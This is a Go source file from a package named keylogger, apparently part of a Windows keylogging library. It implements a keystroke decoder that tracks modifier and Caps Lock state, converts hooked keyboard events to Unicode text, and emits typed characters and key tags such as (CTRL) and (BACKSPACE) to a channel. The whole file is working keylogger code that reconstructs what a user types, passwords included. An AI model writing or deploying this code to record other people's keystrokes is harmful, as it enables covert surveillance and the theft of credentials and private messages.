package keylogger

import (
	"syscall"
	"unicode"

	"github.com/Spriithy/gkl/types"
	"github.com/Spriithy/gkl/user32"
)

var whKeyStateNames = map[types.WPARAM]string{
	types.WM_KEYUP:      "KeyUp",
	types.WM_KEYDOWN:    "KeyDown",
	types.WM_SYSKEYUP:   "SysKeyUp",
	types.WM_SYSKEYDOWN: "SysKeyDown",
}

type KeyStrokeDecoder struct {
	input         chan *KeyboardEvent
	output        chan string
	shiftState    bool
	capsState     bool
	menuState     bool
	ctrlState     bool
	keyboardState [256]uint8
}

func NewKeyStrokeDecoder(input chan *KeyboardEvent, output chan string) *KeyStrokeDecoder {
	return &KeyStrokeDecoder{
		input:  input,
		output: output,
	}
}

func (ksd *KeyStrokeDecoder) Listen() {
	for {
		event := <-ksd.input
		// kbd := event.HookStruct

		user32.GetKeyboardState(types.PBYTE(&ksd.keyboardState[0]))

		/*
			for i := range ksd.keyboardState {
				ksd.keyboardState[i] = byte((user32.GetAsyncKeyState(i) >> 8) & 0xff)
			}
		*/

		if ksd.shiftState {
			ksd.keyboardState[types.VK_SHIFT] = 0x80
		}

		if ksd.menuState {
			ksd.keyboardState[types.VK_MENU] = 0x80
		}

		if ksd.ctrlState {
			ksd.keyboardState[types.VK_CONTROL] = 0x80
		}

		if ksd.capsState {
			ksd.keyboardState[types.VK_CAPITAL] = 0x01
		}

		var buf [4]uint16
		unicodeErr := user32.ToUnicodeEx(
			types.UINT(event.HookStruct.VkCode),
			types.UINT(event.HookStruct.ScanCode),
			types.PBYTE(&ksd.keyboardState[0]),
			types.LPCWSTR(&buf[0]),
			cap(buf),
			types.UINT(event.HookStruct.Flags),
			event.Layout,
		) <= 0

		key := syscall.UTF16ToString(buf[:])
		// key := rune(user32.MapVirtualKeyExW(types.UINT(event.HookStruct.VkCode), types.MAPVK_VK_TO_CHAR, event.Layout))

		switch {
		case event.IsControl() && event.IsDown():
			ksd.ctrlState = true
			ksd.output <- "(CTRL)"

		case event.IsControl() && event.IsUp():
			ksd.ctrlState = false

		case event.IsShift() && event.IsDown():
			ksd.shiftState = true

		case event.IsShift() && event.IsUp():
			ksd.shiftState = false

		case event.IsMenu() && event.IsDown():
			ksd.menuState = true

		case event.IsMenu() && event.IsUp():
			ksd.menuState = false

		case event.IsCaps() && event.IsDown():
			ksd.capsState = !ksd.capsState

		case event.IsNumLock() && event.IsDown():
			ksd.output <- "(NUMLOCK)"

		case event.IsTab() && event.IsKeyDown():
			ksd.output <- "(TAB)"

		case event.IsTab() && event.IsSysKeyDown():
			/*
				if ksd.shiftState {
					ksd.output <- "(ALT+SHIFT+TAB)"
				} else {
					ksd.output <- "(ALT+TAB)"
				}
			*/

		case event.IsEscape() && event.IsDown():
			ksd.output <- "(ESC)"

		case event.IsBackspace() && event.IsDown():
			ksd.output <- "(BACKSPACE)"

		case event.IsReturn() && event.IsDown():
			ksd.output <- "↩\n"
		}

		if !unicodeErr && unicode.IsPrint(rune(key[0])) && event.IsDown() {
			ksd.output <- key
		}

	}
}
